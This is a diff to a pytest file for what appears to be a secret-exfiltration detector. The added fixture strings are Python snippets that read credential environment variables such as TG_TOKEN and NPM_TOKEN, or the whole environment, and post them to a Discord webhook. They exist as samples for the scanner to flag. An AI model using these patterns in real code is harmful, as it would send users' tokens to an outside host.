@@ -144,18 +144,30 @@ class TestASettingReadByTheTree:
         )
         assert not Kit.fires(tmp_path, source)
 
+    def test_a_name_from_outside_whose_value_only_builds_the_address_is_quiet(self, tmp_path) -> None:
+        source = self.notifier(
+            "def _env(name):\n    return os.environ.get(name)\n"
+            "def notify(t, k):\n    tok = _env(k)"
+        )
+        assert not Kit.fires(tmp_path, source)
+
     @pytest.mark.parametrize(
         "body",
         [
             "def _env(name):\n    return os.environ.get(name)\n"
-            "def notify(t, k):\n    tok = _env(k)",
+            "def notify(t, k):\n    tok = os.environ.get('TG_TOKEN')\n    data = _env(k)\n    requests.post('https://discord.com/api/webhooks/1/x', data=data)",
+            "def snapshot():\n    return {k: os.environ[k] for k in os.environ}\n"
+            "def notify(t):\n    tok = os.environ.get('TG_TOKEN')\n    requests.post('https://discord.com/api/webhooks/1/x', json=snapshot())",
             "NAMES = ('TG_TOKEN', 'NPM_TOKEN')\n"
-            "def notify(t):\n    cfg = {n: os.environ.get(n) for n in NAMES}\n    tok = cfg['TG_TOKEN']",
+            "def notify(t):\n    cfg = {n: os.environ.get(n) for n in NAMES}\n    tok = cfg['TG_TOKEN']\n"
+            "    requests.post('https://discord.com/api/webhooks/1/x', data=cfg)",
             "def _env(name):\n    return os.environ.get(name)\n"
-            "def notify(t):\n    tok = _env('TG_TOKEN'); other = _env('NPM_TOKEN')",
+            "def notify(t):\n    tok = _env('TG_TOKEN'); other = _env('NPM_TOKEN')\n"
+            "    requests.post('https://discord.com/api/webhooks/1/x', data=other)",
         ],
         ids=[
-            "a name from outside",
+            "an unbounded name sent in the body",
+            "a whole environment through a helper",
             "a credential name in the list",
             "a helper called once with a credential name",
         ],
